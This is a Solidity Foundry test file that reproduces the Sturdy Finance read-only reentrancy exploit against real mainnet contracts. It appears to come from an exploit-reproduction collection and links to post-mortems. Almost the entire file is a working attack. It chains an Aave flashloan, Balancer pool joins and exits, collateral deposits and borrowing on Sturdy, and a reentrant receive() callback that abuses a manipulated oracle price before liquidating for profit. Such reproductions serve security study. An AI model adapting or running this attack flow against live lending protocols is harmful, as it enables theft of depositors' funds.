// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~800K USD$
// Attacker : https://etherscan.io/address/0x1e8419e724d51e87f78e222d935fbbdeb631a08b
// Attack Contract : https://etherscan.io/address/0x0b09c86260c12294e3b967f0d523b4b2bcdfbeab
// Vulnerable Contract : https://etherscan.io/address/0x9f72dc67cec672bb99e3d02cbea0a21536a2b657
// Attack Tx : https://etherscan.io/tx/0xeb87ebc0a18aca7d2a9ffcabf61aa69c9e8d3c6efade9e2303f8857717fb9eb7

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x46bea99d977f269399fb3a4637077bb35f075516#code

// @Analysis
// Post-mortem : https://sturdyfinance.medium.com/exploit-post-mortem-49261493307a
// Twitter Guy : https://twitter.com/AnciliaInc/status/1668081008615325698
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1668084629654638592

interface IwstETH is IERC20 {
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
}

interface IMetaStablePool is IERC20 {
    function getPoolId() external view returns (bytes32);
}

interface LendingPool {
    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralETH,
            uint256 totalDebtETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );

    function liquidationCall(
        address collateralAsset,
        address debtAsset,
        address user,
        uint256 debtToCover,
        bool receiveAToken
    ) external;

    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
}

interface ILPVault {
    function depositCollateralFrom(address _asset, uint256 _amount, address _user) external payable;

    function withdrawCollateral(address _asset, uint256 _amount, uint256 _slippage, address _to) external;
}

interface IBalancerQueries {
    function queryJoin(
        bytes32 poolId,
        address sender,
        address recipient,
        IBalancerVault.JoinPoolRequest memory request
    ) external returns (uint256 bptOut, uint256[] memory amountsIn);

    function queryExit(
        bytes32 poolId,
        address sender,
        address recipient,
        IBalancerVault.ExitPoolRequest memory request
    ) external returns (uint256 bptIn, uint256[] memory amountsOut);
}

interface ISturdyOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}

contract ContractTest is Test {
    WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH wstETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 steCRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IMetaStablePool B_STETH_STABLE = IMetaStablePool(0x32296969Ef14EB0c6d29669C550D4a0449130230);
    ICurvePool LidoCurvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    LendingPool lendingPool = LendingPool(0x9f72DC67ceC672bB99e3d02CbEA0a21536a2b657);
    ILPVault AuraBalancerLPVault = ILPVault(0x6AE5Fd07c0Bb2264B1F60b33F65920A2b912151C);
    ILPVault ConvexCurveLPVault2 = ILPVault(0xa36BE47700C079BD94adC09f35B0FA93A55297bc);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IBalancerQueries BalancerQueries = IBalancerQueries(0xE39B5e3B6D74016b2F6A9673D7d7493B6DF549d5);
    ISturdyOracle SturdyOracle = ISturdyOracle(0xe5d78eB340627B8D5bcFf63590Ebec1EF9118C89);

    function setUp() public {
        vm.createSelectFork("mainnet", 17_460_609);
        vm.label(address(wstETH), "wstETH");
        vm.label(address(WETH), "WETH");
        vm.label(address(steCRV), "steCRV");
        vm.label(address(stETH), "stETH");
        vm.label(address(B_STETH_STABLE), "B_STETH_STABLE");
        vm.label(address(LidoCurvePool), "LidoCurvePool");
        vm.label(address(lendingPool), "lendingPool");
        vm.label(address(AuraBalancerLPVault), "AuraBalancerLPVault");
        vm.label(address(ConvexCurveLPVault2), "ConvexCurveLPVault2");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(aaveV3), "aaveV3");
        vm.label(address(BalancerQueries), "BalancerQueries");
        vm.label(address(SturdyOracle), "SturdyOracle");
    }

    function testExploit() public {
        deal(address(this), 0);
        address[] memory assets = new address[](2);
        assets[0] = address(wstETH);
        assets[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 50_000 * 1e18;
        amounts[1] = 60_000 * 1e18;
        uint256[] memory modes = new uint[](2);
        modes[0] = 0;
        modes[1] = 0;
        console.log("1. Borrow 50,000 wstETH and 60,000 WETH from Aave as a flashloan.");
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0); // Borrow 50,000 wstETH and 60,000 WETH from Aave as a flashloan.

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        WETH.withdraw(1100 ether);
        uint256[2] memory amount;
        amount[0] = 1100 ether;
        amount[1] = 0;
        console.log("2. Add 1,100 ETH to steCRV pool to mint 1,023 steCRV.");
        LidoCurvePool.add_liquidity{value: 1100 ether}(amount, 1000 ether); // Add 1,100 ETH to steCRV pool to mint 1,023 steCRV.

        for (uint256 i; i < 1; i++) {
            Exploiter exploiter = new Exploiter();
            vm.label(address(exploiter), "exploiter");
            WETH.transfer(address(exploiter), WETH.balanceOf(address(this)));
            wstETH.transfer(address(exploiter), wstETH.balanceOf(address(this)));
            steCRV.transfer(address(exploiter), steCRV.balanceOf(address(this)));
            exploiter.yoink();
        }

        LidoCurvePool.remove_liquidity_one_coin(steCRV.balanceOf(address(this)), 0, 1000 * 1e18); // burn steCRV, get WETH
        wstETH.unwrap(wstETH.balanceOf(address(this)) - amounts[0] - premiums[0]); // burn redundant wstETH, get WETH
        stETH.approve(address(LidoCurvePool), stETH.balanceOf(address(this)));
        LidoCurvePool.exchange(1, 0, stETH.balanceOf(address(this)), 1); // swap stETH to ETH
        WETH.deposit{value: address(this).balance}();

        IERC20(assets[0]).approve(address(aaveV3), amounts[0] + premiums[0]);
        IERC20(assets[1]).approve(address(aaveV3), amounts[1] + premiums[1]);

        return true;
    }

    receive() external payable {}
}

contract Exploiter is Test {
    address owner;
    uint256 nonce;
    WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH wstETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 steCRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IMetaStablePool B_STETH_STABLE = IMetaStablePool(0x32296969Ef14EB0c6d29669C550D4a0449130230);
    ICurvePool LidoCurvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    LendingPool lendingPool = LendingPool(0x9f72DC67ceC672bB99e3d02CbEA0a21536a2b657);
    ILPVault AuraBalancerLPVault = ILPVault(0x6AE5Fd07c0Bb2264B1F60b33F65920A2b912151C);
    ILPVault ConvexCurveLPVault2 = ILPVault(0xa36BE47700C079BD94adC09f35B0FA93A55297bc);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IBalancerQueries BalancerQueries = IBalancerQueries(0xE39B5e3B6D74016b2F6A9673D7d7493B6DF549d5);
    ISturdyOracle SturdyOracle = ISturdyOracle(0xe5d78eB340627B8D5bcFf63590Ebec1EF9118C89);
    address cB_stETH_STABLE = 0x10aA9eea35A3102Cc47d4d93Bc0BA9aE45557746;
    address csteCRV = 0x901247D08BEbFD449526Da92941B35D756873Bcd;

    constructor() {
        owner = msg.sender;
    }

    function yoink() external {
        joinBalancerPool();
        depositCollateralAndBorrow();
        exitBalancerPool();
        withdrawCollateralAndLiquidation();
        removeBalancerPoolLiquidity();
        WETH.deposit{value: address(this).balance}();
        wstETH.transfer(owner, wstETH.balanceOf(address(this)));
        WETH.transfer(owner, WETH.balanceOf(address(this)));
        steCRV.transfer(owner, steCRV.balanceOf(address(this)));
    }

    function setJoinData(uint256 amt) internal view returns (IBalancerVault.JoinPoolRequest memory request) {
        uint256[] memory amountIn = new uint256[](2);
        amountIn[0] = 50_000 * 1e18;
        amountIn[1] = 57_000 * 1e18;
        bytes memory data = abi.encode(uint256(1), amountIn, amt);
        request = IBalancerVault.JoinPoolRequest({
            asset: new address[](2),
            maxAmountsIn: amountIn,
            userData: data,
            fromInternalBalance: false
        });
        request.asset[0] = address(wstETH);
        request.asset[1] = address(WETH);
        return request;
    }

    function joinBalancerPool() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        IBalancerVault.JoinPoolRequest memory request = setJoinData(0);
        (uint256 bptOut,) = BalancerQueries.queryJoin(poolId, address(this), address(this), request);
        wstETH.approve(address(Balancer), 50_000 * 1e18);
        WETH.approve(address(Balancer), 57_000 * 1e18);
        request = setJoinData(bptOut);
        console.log(
            "3. Add 50,000 wstETH and 57,000 WETH to the Balancer B-stETH-STABLE pool to mint 109,517 B-stETH-STABLE"
        );
        Balancer.joinPool(poolId, address(this), address(this), request); // Add 50,000 wstETH and 57,000 WETH to the Balancer B-stETH-STABLE pool to mint 109,517 B-stETH-STABLE
    }

    function depositCollateralAndBorrow() internal {
        console.log("4. Deposit 1,000 steCRV and 233 B-stETH-STABLE as collateral into Sturdy.");
        steCRV.approve(address(ConvexCurveLPVault2), 1000 * 1e18);
        ConvexCurveLPVault2.depositCollateralFrom(address(steCRV), 1000 * 1e18, address(this));
        B_STETH_STABLE.approve(address(AuraBalancerLPVault), 233_348_773_557_117_598_739);
        AuraBalancerLPVault.depositCollateralFrom(address(B_STETH_STABLE), 233_348_773_557_117_598_739, address(this)); // Deposit 1,000 steCRV and 233 B-stETH-STABLE as collateral into Sturdy.

        console.log("5. Borrow 513 WETH from Sturdy.");
        lendingPool.borrow(address(WETH), 513_367_301_825_658_717_226, 2, 0, address(this)); // Borrow 513 WETH from Sturdy.
    }

    function setExitData(uint256 amt) internal view returns (IBalancerVault.ExitPoolRequest memory request) {
        uint256[] memory amountOut = new uint256[](2);
        amountOut[0] = 0;
        amountOut[1] = 0;
        bytes memory data = abi.encode(uint256(1), amt);
        request = IBalancerVault.ExitPoolRequest({
            asset: new address[](2),
            minAmountsOut: amountOut,
            userData: data,
            toInternalBalance: false
        });
        request.asset[0] = address(wstETH);
        request.asset[1] = address(0);
        return request;
    }

    function exitBalancerPool() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        uint256 amt = B_STETH_STABLE.balanceOf(address(this));
        IBalancerVault.ExitPoolRequest memory request = setExitData(amt);
        BalancerQueries.queryExit(poolId, address(this), address(this), request);
        console.log(
            "6. Remove 109,284 B-stETH-STABLE from the Balancer B-stETH-STABLE pool to receive wstETH and WETH. \n"
        );
        B_STETH_STABLE.approve(address(Balancer), B_STETH_STABLE.balanceOf(address(this)));

        emit log_named_decimal_uint(
            "Before Read-Only-Reentrancy Collateral Price \t",
            SturdyOracle.getAssetPrice(cB_stETH_STABLE),
            B_STETH_STABLE.decimals()
        );
        Balancer.exitPool(poolId, address(this), payable(address(this)), request);
    }

    receive() external payable {
        nonce++;
        if (nonce == 1) {
            // Manipulate the price of B-stETH-STABLE and set steCRV as non-collateral during the manipulation. As the price of
            // B-stETH-STABLE increases threefold, the protocol considers the attacker's 233 collateralized B-stETH-STABLE enough
            // to cover the 513 WETH debt. Consequently, the attacker's steCRV is allowed to be no longer used as collateral.
            emit log_named_decimal_uint(
                "In Read-Only-Reentrancy Collateral Price \t",
                SturdyOracle.getAssetPrice(cB_stETH_STABLE),
                B_STETH_STABLE.decimals()
            );
            console.log("7. set steCRV as non-collateral during the manipulation.");
            lendingPool.setUserUseReserveAsCollateral(address(csteCRV), false);
        }
    }

    function withdrawCollateralAndLiquidation() internal {
        emit log_named_decimal_uint(
            "After Read-Only-Reentrancy Collateral Price \t",
            SturdyOracle.getAssetPrice(cB_stETH_STABLE),
            B_STETH_STABLE.decimals()
        );
        console.log("");
        console.log("8. Withdraw 1,000 steCRV from Sturdy.");
        ConvexCurveLPVault2.withdrawCollateral(address(steCRV), 1000 * 1e18, 10, address(this)); // Withdraw 1,000 steCRV from Sturdy.
        (, uint256 totalDebt,,,,) = lendingPool.getUserAccountData(address(this));
        console.log("9. attacker liquidates their position to reclaim collateral with 236 WETH");
        // As the price of B-stETH-STABLE returns to normal, the attacker liquidates their position with 236 WETH to reclaim
        // 233 B-stETH-STABLE (worth approximately 106 wstETH + 120 WETH).
        WETH.approve(address(lendingPool), totalDebt);
        lendingPool.liquidationCall(address(B_STETH_STABLE), address(WETH), address(this), totalDebt, false);
    }

    function removeBalancerPoolLiquidity() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        uint256 amt = B_STETH_STABLE.balanceOf(address(this));
        IBalancerVault.ExitPoolRequest memory request = setExitData(amt);
        BalancerQueries.queryExit(poolId, address(this), address(this), request);
        B_STETH_STABLE.approve(address(Balancer), B_STETH_STABLE.balanceOf(address(this)));
        console.log(
            "10. Remove 233 B-stETH-STABLE from the Balancer B-stETH-STABLE pool to receive 106 wstETH and 120 WETH. \n"
        );
        Balancer.exitPool(poolId, address(this), payable(address(this)), request);
    }
}
